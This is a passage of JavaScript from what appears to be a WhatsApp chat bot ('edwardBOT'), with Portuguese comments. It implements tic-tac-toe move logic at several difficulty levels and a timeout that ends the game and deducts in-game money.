((esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
 (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "❌" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
 (esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "❌" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
 (esp.a1 == "⭕" && esp.a2 == "❌" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌"))) {
tttset.reActivate1 = "off"
esp.c1 = "⭕"
} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
((esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "❌" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
 (esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "❌" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕"))) {
tttset.reActivate1 = "off"
esp.c2 = "⭕"
} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
((esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
 (esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "❌" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
 (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "❌" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
 (esp.a1 == "🔲" && esp.a2 == "❌" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲"))) {
tttset.reActivate1 = "off"
esp.c3 = "⭕"
} else if (tttset.tttdifficulty == "IMPOSSIBLE" && (esp.a1 =="🔲" || esp.a3 =="🔲" || esp.b2 =="🔲" || esp.c1 =="🔲" || esp.c3 =="🔲")) {
//PRIORIZAR CANTOS E CENTRO
tttset.reActivate1 = "off"
while (tttset.reActivate3 == "on") {
priorityC()
}
tttset.reActivate3 = "on"
//FIM DO MODO IMPOSSIVEL
} else if (tttset.tttdifficulty == "HARD" && ( 
//TESTE PARA TENTATIVA DE VITÓRIA
(esp.a1=="⭕"&&esp.a2=="⭕"&&esp.a3=="🔲") || (esp.a1=="⭕"&&esp.a2=="🔲"&&esp.a3=="⭕") || (esp.a1=="🔲"&&esp.a2=="⭕"&&esp.a3=="⭕") ||
(esp.b1=="⭕"&&esp.b2=="⭕"&&esp.b3=="🔲") || (esp.b1=="⭕"&&esp.b2=="🔲"&&esp.b3=="⭕") || (esp.b1=="🔲"&&esp.b2=="⭕"&&esp.b3=="⭕") ||
(esp.c1=="⭕"&&esp.c2=="⭕"&&esp.c3=="🔲") || (esp.c1=="⭕"&&esp.c2=="🔲"&&esp.c3=="⭕") || (esp.c1=="🔲"&&esp.c2=="⭕"&&esp.c3=="⭕") ||
(esp.a1=="⭕"&&esp.b1=="⭕"&&esp.c1=="🔲") || (esp.a1=="⭕"&&esp.b1=="🔲"&&esp.c1=="⭕") || (esp.a1=="🔲"&&esp.b1=="⭕"&&esp.c1=="⭕") ||
(esp.a2=="⭕"&&esp.b2=="⭕"&&esp.c2=="🔲") || (esp.a2=="⭕"&&esp.b2=="🔲"&&esp.c2=="⭕") || (esp.a2=="🔲"&&esp.b2=="⭕"&&esp.c2=="⭕") ||
(esp.a3=="⭕"&&esp.b3=="⭕"&&esp.c3=="🔲") || (esp.a3=="⭕"&&esp.b3=="🔲"&&esp.c3=="⭕") || (esp.a3=="🔲"&&esp.b3=="⭕"&&esp.c3=="⭕") ||
(esp.a1=="⭕"&&esp.b2=="⭕"&&esp.c3=="🔲") || (esp.a1=="⭕"&&esp.b2=="🔲"&&esp.c3=="⭕") || (esp.a1=="🔲"&&esp.b2=="⭕"&&esp.c3=="⭕") ||
(esp.a3=="⭕"&&esp.b2=="⭕"&&esp.c1=="🔲") || (esp.a3=="⭕"&&esp.b2=="🔲"&&esp.c1=="⭕") || (esp.a3=="🔲"&&esp.b2=="⭕"&&esp.c1=="⭕") ||
//TESTE PARA TENTATIVA DE BLOQUEIO
(esp.a1=="❌"&&esp.a2=="❌"&&esp.a3=="🔲") || (esp.a1=="❌"&&esp.a2=="🔲"&&esp.a3=="❌") || (esp.a1=="🔲"&&esp.a2=="❌"&&esp.a3=="❌") ||
(esp.b1=="❌"&&esp.b2=="❌"&&esp.b3=="🔲") || (esp.b1=="❌"&&esp.b2=="🔲"&&esp.b3=="❌") || (esp.b1=="🔲"&&esp.b2=="❌"&&esp.b3=="❌") ||
(esp.c1=="❌"&&esp.c2=="❌"&&esp.c3=="🔲") || (esp.c1=="❌"&&esp.c2=="🔲"&&esp.c3=="❌") || (esp.c1=="🔲"&&esp.c2=="❌"&&esp.c3=="❌") ||
(esp.a1=="❌"&&esp.b1=="❌"&&esp.c1=="🔲") || (esp.a1=="❌"&&esp.b1=="🔲"&&esp.c1=="❌") || (esp.a1=="🔲"&&esp.b1=="❌"&&esp.c1=="❌") ||
(esp.a2=="❌"&&esp.b2=="❌"&&esp.c2=="🔲") || (esp.a2=="❌"&&esp.b2=="🔲"&&esp.c2=="❌") || (esp.a2=="🔲"&&esp.b2=="❌"&&esp.c2=="❌") ||
(esp.a3=="❌"&&esp.b3=="❌"&&esp.c3=="🔲") || (esp.a3=="❌"&&esp.b3=="🔲"&&esp.c3=="❌") || (esp.a3=="🔲"&&esp.b3=="❌"&&esp.c3=="❌") ||
(esp.a1=="❌"&&esp.b2=="❌"&&esp.c3=="🔲") || (esp.a1=="❌"&&esp.b2=="🔲"&&esp.c3=="❌") || (esp.a1=="🔲"&&esp.b2=="❌"&&esp.c3=="❌") ||
(esp.a3=="❌"&&esp.b2=="❌"&&esp.c1=="🔲") || (esp.a3=="❌"&&esp.b2=="🔲"&&esp.c1=="❌") || (esp.a3=="🔲"&&esp.b2=="❌"&&esp.c1=="❌")
)){
//HARD
tttset.reActivate1 = "off"
IAmove1()
} else if (tttset.tttdifficulty == "NORMAL" && ( 
//TESTE PARA TENTATIVA DE VITÓRIA
(esp.a1=="⭕"&&esp.a2=="⭕"&&esp.a3=="🔲") || (esp.a1=="⭕"&&esp.a2=="🔲"&&esp.a3=="⭕") || (esp.a1=="🔲"&&esp.a2=="⭕"&&esp.a3=="⭕") ||
(esp.b1=="⭕"&&esp.b2=="⭕"&&esp.b3=="🔲") || (esp.b1=="⭕"&&esp.b2=="🔲"&&esp.b3=="⭕") || (esp.b1=="🔲"&&esp.b2=="⭕"&&esp.b3=="⭕") ||
(esp.c1=="⭕"&&esp.c2=="⭕"&&esp.c3=="🔲") || (esp.c1=="⭕"&&esp.c2=="🔲"&&esp.c3=="⭕") || (esp.c1=="🔲"&&esp.c2=="⭕"&&esp.c3=="⭕") ||
(esp.a1=="⭕"&&esp.b1=="⭕"&&esp.c1=="🔲") || (esp.a1=="⭕"&&esp.b1=="🔲"&&esp.c1=="⭕") || (esp.a1=="🔲"&&esp.b1=="⭕"&&esp.c1=="⭕") ||
(esp.a2=="⭕"&&esp.b2=="⭕"&&esp.c2=="🔲") || (esp.a2=="⭕"&&esp.b2=="🔲"&&esp.c2=="⭕") || (esp.a2=="🔲"&&esp.b2=="⭕"&&esp.c2=="⭕") ||
(esp.a3=="⭕"&&esp.b3=="⭕"&&esp.c3=="🔲") || (esp.a3=="⭕"&&esp.b3=="🔲"&&esp.c3=="⭕") || (esp.a3=="🔲"&&esp.b3=="⭕"&&esp.c3=="⭕") ||
(esp.a1=="⭕"&&esp.b2=="⭕"&&esp.c3=="🔲") || (esp.a1=="⭕"&&esp.b2=="🔲"&&esp.c3=="⭕") || (esp.a1=="🔲"&&esp.b2=="⭕"&&esp.c3=="⭕") ||
(esp.a3=="⭕"&&esp.b2=="⭕"&&esp.c1=="🔲") || (esp.a3=="⭕"&&esp.b2=="🔲"&&esp.c1=="⭕") || (esp.a3=="🔲"&&esp.b2=="⭕"&&esp.c1=="⭕") ||
//TESTE PARA TENTATIVA DE BLOQUEIO
(esp.a1=="❌"&&esp.a2=="❌"&&esp.a3=="🔲") || (esp.a1=="❌"&&esp.a2=="🔲"&&esp.a3=="❌") || (esp.a1=="🔲"&&esp.a2=="❌"&&esp.a3=="❌") ||
(esp.b1=="❌"&&esp.b2=="❌"&&esp.b3=="🔲") || (esp.b1=="❌"&&esp.b2=="🔲"&&esp.b3=="❌") || (esp.b1=="🔲"&&esp.b2=="❌"&&esp.b3=="❌") ||
(esp.c1=="❌"&&esp.c2=="❌"&&esp.c3=="🔲") || (esp.c1=="❌"&&esp.c2=="🔲"&&esp.c3=="❌") || (esp.c1=="🔲"&&esp.c2=="❌"&&esp.c3=="❌") ||
(esp.a1=="❌"&&esp.b1=="❌"&&esp.c1=="🔲") || (esp.a1=="❌"&&esp.b1=="🔲"&&esp.c1=="❌") || (esp.a1=="🔲"&&esp.b1=="❌"&&esp.c1=="❌") ||
(esp.a2=="❌"&&esp.b2=="❌"&&esp.c2=="🔲") || (esp.a2=="❌"&&esp.b2=="🔲"&&esp.c2=="❌") || (esp.a2=="🔲"&&esp.b2=="❌"&&esp.c2=="❌") ||
(esp.a3=="❌"&&esp.b3=="❌"&&esp.c3=="🔲") || (esp.a3=="❌"&&esp.b3=="🔲"&&esp.c3=="❌") || (esp.a3=="🔲"&&esp.b3=="❌"&&esp.c3=="❌") ||
(esp.a1=="❌"&&esp.b2=="❌"&&esp.c3=="🔲") || (esp.a1=="❌"&&esp.b2=="🔲"&&esp.c3=="❌") || (esp.a1=="🔲"&&esp.b2=="❌"&&esp.c3=="❌") ||
(esp.a3=="❌"&&esp.b2=="❌"&&esp.c1=="🔲") || (esp.a3=="❌"&&esp.b2=="🔲"&&esp.c1=="❌") || (esp.a3=="🔲"&&esp.b2=="❌"&&esp.c1=="❌")
)){
//NORMAL
tttset.reActivate1 = "off"
let randomNORMAL = Math.floor(Math.random() * 3)
if (randomNORMAL == 0 || randomNORMAL == 1) {
IAmove1()
} else {
while (tttset.reActivate2 == "on") {
IAalter()
}
}
tttset.reActivate2 = "on"
} else {
//EASY / RANDOM
let randomALL = Math.floor(Math.random() * 9)
switch (randomALL) {
case 0:
if (esp.a1 == "🔲") {
tttset.reActivate1 = "off"
esp.a1 = "⭕"
}
break
case 1:
if (esp.a2 == "🔲") {
tttset.reActivate1 = "off"
esp.a2 = "⭕"
}
break
case 2:
if (esp.a3 == "🔲") {
tttset.reActivate1 = "off"
esp.a3 = "⭕"
}
break
case 3:
if (esp.b1 == "🔲") {
tttset.reActivate1 = "off"
esp.b1 = "⭕"
}
break
case 4:
if (esp.b2 == "🔲") {
tttset.reActivate1 = "off"
esp.b2 = "⭕"
}
break
case 5:
if (esp.b3 == "🔲") {
tttset.reActivate1 = "off"
esp.b3 = "⭕"
}
break
case 6:
if (esp.c1 == "🔲") {
tttset.reActivate1 = "off"
esp.c1 = "⭕"
}
break
case 7:
if (esp.c2 == "🔲") {
tttset.reActivate1 = "off"
esp.c2 = "⭕"
}
break
case 8:
if (esp.c3 == "🔲") {
tttset.reActivate1 = "off"
esp.c3 = "⭕"
}
break
}
}
}

const IAmove1 = () => {
//JOGADA PARA VITÓRIA
if (esp.a1=="⭕"&&esp.a2=="⭕"&&esp.a3=="🔲") {
esp.a3 = "⭕"
} else if (esp.a1=="⭕"&&esp.a2=="🔲"&&esp.a3=="⭕") {
esp.a2 = "⭕"
} else if (esp.a1=="🔲"&&esp.a2=="⭕"&&esp.a3=="⭕") {
esp.a1 = "⭕"
} else if (esp.b1=="⭕"&&esp.b2=="⭕"&&esp.b3=="🔲") {
esp.b3 = "⭕"
} else if (esp.b1=="⭕"&&esp.b2=="🔲"&&esp.b3=="⭕") {
esp.b2 = "⭕"
} else if (esp.b1=="🔲"&&esp.b2=="⭕"&&esp.b3=="⭕") {
esp.b1 = "⭕"
} else if (esp.c1=="⭕"&&esp.c2=="⭕"&&esp.c3=="🔲") {
esp.c3 = "⭕"
} else if (esp.c1=="⭕"&&esp.c2=="🔲"&&esp.c3=="⭕") {
esp.c2 = "⭕"
} else if (esp.c1=="🔲"&&esp.c2=="⭕"&&esp.c3=="⭕") {
esp.c1 = "⭕"
} else if (esp.a1=="⭕"&&esp.b1=="⭕"&&esp.c1=="🔲") {
esp.c1 = "⭕"
} else if (esp.a1=="⭕"&&esp.b1=="🔲"&&esp.c1=="⭕") {
esp.b1 = "⭕"
} else if (esp.a1=="🔲"&&esp.b1=="⭕"&&esp.c1=="⭕") {
esp.a1 = "⭕"
} else if (esp.a2=="⭕"&&esp.b2=="⭕"&&esp.c2=="🔲") {
esp.c2 = "⭕"
} else if (esp.a2=="⭕"&&esp.b2=="🔲"&&esp.c2=="⭕") {
esp.b2 = "⭕"
} else if (esp.a2=="🔲"&&esp.b2=="⭕"&&esp.c2=="⭕") {
esp.a2 = "⭕"
} else if (esp.a3=="⭕"&&esp.b3=="⭕"&&esp.c3=="🔲") {
esp.c3 = "⭕"
} else if (esp.a3=="⭕"&&esp.b3=="🔲"&&esp.c3=="⭕") {
esp.b3 = "⭕"
} else if (esp.a3=="🔲"&&esp.b3=="⭕"&&esp.c3=="⭕") {
esp.a3 = "⭕"
} else if (esp.a1=="⭕"&&esp.b2=="⭕"&&esp.c3=="🔲") {
esp.c3 = "⭕"
} else if (esp.a1=="⭕"&&esp.b2=="🔲"&&esp.c3=="⭕") {
esp.b2 = "⭕"
} else if (esp.a1=="🔲"&&esp.b2=="⭕"&&esp.c3=="⭕") {
esp.a1 = "⭕"
} else if (esp.a3=="⭕"&&esp.b2=="⭕"&&esp.c1=="🔲") {
esp.c1 = "⭕"
} else if (esp.a3=="⭕"&&esp.b2=="🔲"&&esp.c1=="⭕") {
esp.b2 = "⭕"
} else if (esp.a3=="🔲"&&esp.b2=="⭕"&&esp.c1=="⭕") {
esp.a3 = "⭕"
//JOGADA PARA BLOQUEIO
} else if (esp.a1=="❌"&&esp.a2=="❌"&&esp.a3=="🔲") {
esp.a3 = "⭕"
} else if (esp.a1=="❌"&&esp.a2=="🔲"&&esp.a3=="❌") {
esp.a2 = "⭕"
} else if (esp.a1=="🔲"&&esp.a2=="❌"&&esp.a3=="❌") {
esp.a1 = "⭕"
} else if (esp.b1=="❌"&&esp.b2=="❌"&&esp.b3=="🔲") {
esp.b3 = "⭕"
} else if (esp.b1=="❌"&&esp.b2=="🔲"&&esp.b3=="❌") {
esp.b2 = "⭕"
} else if (esp.b1=="🔲"&&esp.b2=="❌"&&esp.b3=="❌") {
esp.b1 = "⭕"
} else if (esp.c1=="❌"&&esp.c2=="❌"&&esp.c3=="🔲") {
esp.c3 = "⭕"
} else if (esp.c1=="❌"&&esp.c2=="🔲"&&esp.c3=="❌") {
esp.c2 = "⭕"
} else if (esp.c1=="🔲"&&esp.c2=="❌"&&esp.c3=="❌") {
esp.c1 = "⭕"
} else if (esp.a1=="❌"&&esp.b1=="❌"&&esp.c1=="🔲") {
esp.c1 = "⭕"
} else if (esp.a1=="❌"&&esp.b1=="🔲"&&esp.c1=="❌") {
esp.b1 = "⭕"
} else if (esp.a1=="🔲"&&esp.b1=="❌"&&esp.c1=="❌") {
esp.a1 = "⭕"
} else if (esp.a2=="❌"&&esp.b2=="❌"&&esp.c2=="🔲") {
esp.c2 = "⭕"
} else if (esp.a2=="❌"&&esp.b2=="🔲"&&esp.c2=="❌") {
esp.b2 = "⭕"
} else if (esp.a2=="🔲"&&esp.b2=="❌"&&esp.c2=="❌") {
esp.a2 = "⭕"
} else if (esp.a3=="❌"&&esp.b3=="❌"&&esp.c3=="🔲") {
esp.c3 = "⭕"
} else if (esp.a3=="❌"&&esp.b3=="🔲"&&esp.c3=="❌") {
esp.b3 = "⭕"
} else if (esp.a3=="🔲"&&esp.b3=="❌"&&esp.c3=="❌") {
esp.a3 = "⭕"
} else if (esp.a1=="❌"&&esp.b2=="❌"&&esp.c3=="🔲") {
esp.c3 = "⭕"
} else if (esp.a1=="❌"&&esp.b2=="🔲"&&esp.c3=="❌") {
esp.b2 = "⭕"
} else if (esp.a1=="🔲"&&esp.b2=="❌"&&esp.c3=="❌") {
esp.a1 = "⭕"
} else if (esp.a3=="❌"&&esp.b2=="❌"&&esp.c1=="🔲") {
esp.c1 = "⭕"
} else if (esp.a3=="❌"&&esp.b2=="🔲"&&esp.c1=="❌") {
esp.b2 = "⭕"
} else if (esp.a3=="🔲"&&esp.b2=="❌"&&esp.c1=="❌") {
esp.a3 = "⭕"
}
}

//MOVIMENTO ALTERNATIVO
const IAalter = () => {
let randomALTER = Math.floor(Math.random() * 9)
switch (randomALTER) {
case 0:
if (esp.a1 == "🔲") {
tttset.reActivate2 = "off"
esp.a1 = "⭕"
}
break
case 1:
if (esp.a2 == "🔲") {
tttset.reActivate2 = "off"
esp.a2 = "⭕"
}
break
case 2:
if (esp.a3 == "🔲") {
tttset.reActivate2 = "off"
esp.a3 = "⭕"
}
break
case 3:
if (esp.b1 == "🔲") {
tttset.reActivate2 = "off"
esp.b1 = "⭕"
}
break
case 4:
if (esp.b2 == "🔲") {
tttset.reActivate2 = "off"
esp.b2 = "⭕"
}
break
case 5:
if (esp.b3 == "🔲") {
tttset.reActivate2 = "off"
esp.b3 = "⭕"
}
break
case 6:
if (esp.c1 == "🔲") {
tttset.reActivate2 = "off"
esp.c1 = "⭕"
}
break
case 7:
if (esp.c2 == "🔲") {
tttset.reActivate2 = "off"
esp.c2 = "⭕"
}
break
case 8:
if (esp.c3 == "🔲") {
tttset.reActivate2 = "off"
esp.c3 = "⭕"
}
break
}
}

//JOGAR NOS CANTOS E CENTRO - IMPOSSIVEL
const priorityC = () => {
let randomPriC = Math.floor(Math.random() * 5)
switch (randomPriC) {
case 0 :
if (esp.a1 == "🔲") {
tttset.reActivate3 = "off"
esp.a1 = "⭕"
}
break
case 1 :
if (esp.a3 == "🔲") {
tttset.reActivate3 = "off"
esp.a3 = "⭕"
}
break
case 2 :
if (esp.b2 == "🔲") {
tttset.reActivate3 = "off"
esp.b2 = "⭕"
}
break
case 3 :
if (esp.c1 == "🔲") {
tttset.reActivate3 = "off"
esp.c1 = "⭕"
}
break
case 4 :
if (esp.c3 == "🔲") {
tttset.reActivate3 = "off"
esp.c3 = "⭕"
}
break
}
}
////FINALIZAR TTT AUTOMATICAMENTE
if (tttset.tttstatus == "off" && tttset.autoEndTime == "on") {
tttset.autoEndTime = "off"
} else if (tttset.tttstatus == "on" && tttset.autoEndTime == "on") {
if (isGroup) {
const randomEndTTTXP = 0 - (Math.floor(Math.random() * 75) + 75)
add_dinheiro(tttset.player, randomEndTTTXP)
const checkTTTIdEnd = getTTTId(tttset.player)
if (checkTTTIdEnd === undefined) addTTTId(tttset.player)
addTTTpoints(tttset.player, randomEndTTTXP)
edward.sendMessage(tttset.local,`❌ O TEMPO DE JOGO EXPIROU ❌\n\n➣PUNIÇÃO: ${randomEndTTTXP} DINHEIRO 🔮`, text, {quoted: tttset.mentionPlayer})
} else {
edward.sendMessage(tttset.local,`❌ O TEMPO DE JOGO EXPIROU ❌`, text, {quoted: tttset.mentionPlayer})
}
esp.a1 = "🔲"; esp.a2 = "🔲"; esp.a3 = "🔲"
esp.b1 = "🔲"; esp.b2 = "🔲"; esp.b3 = "🔲"
esp.c1 = "🔲"; esp.c2 = "🔲"; esp.c3 = "🔲"
tttset.tttstatus = "off"
tttset.autoEndTime = "off"
}
///_ FIM DO TIC-TAC-TOE CONFIG        
    
///-------------------------------------------------------------\\\

/**
* Creditos:
* @Eu
**/

///----------( edwardBOT )----------\\\
